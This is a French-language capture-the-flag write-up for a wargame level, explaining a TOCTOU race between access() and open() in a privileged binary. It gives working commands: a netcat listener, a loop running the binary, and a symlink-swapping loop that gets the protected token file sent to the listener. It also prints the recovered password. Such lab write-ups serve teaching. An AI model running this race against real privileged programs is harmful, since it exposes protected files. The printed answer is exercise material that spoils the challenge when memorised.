# level10

## Contexte

On trouve un exécutable `level10` ainsi qu'un fichier `token`.

Le programme prend un fichier et une adresse IP en paramètres.

## Recherche

Le programme vérifie que l'utilisateur a le droit de lire le fichier avant de l'envoyer via le réseau.

En analysant le binaire, on remarque que cette vérification est faite avec `access()`, puis que le fichier est ouvert plus tard avec `open()`.

## Vulnérabilité

Entre l'appel à `access()` et celui à `open()`, le fichier peut être remplacé.

C'est une vulnérabilité de type **TOCTOU** (*Time Of Check To Time Of Use*).

En changeant très rapidement un lien symbolique entre deux fichiers, on peut faire croire au programme qu'il ouvre un fichier autorisé alors qu'il ouvrira finalement le fichier `token`.

## Exploitation

On lance un serveur pour recevoir les données :

```bash
nc -lk 6969
```

Dans un terminal, on lance le programme en boucle :

```bash
while true; do
    ./level10 /tmp/access 10.0.2.15
done
```

Dans un second terminal, on alterne très rapidement le lien symbolique :

```bash
while true; do
    ln -sf /home/user/level10/token /tmp/access
    ln -sf /tmp/empty /tmp/access
done
```

Après plusieurs tentatives, le contenu du fichier `token` est envoyé au serveur.

On utilise ensuite ce mot de passe pour se connecter à `flag10` puis lancer `getflag` :

```text
feulo4b72j7edeahuete3no7c
```

## Ressources

- TOCTOU
- `access()`
- Liens symboliques
- `nc`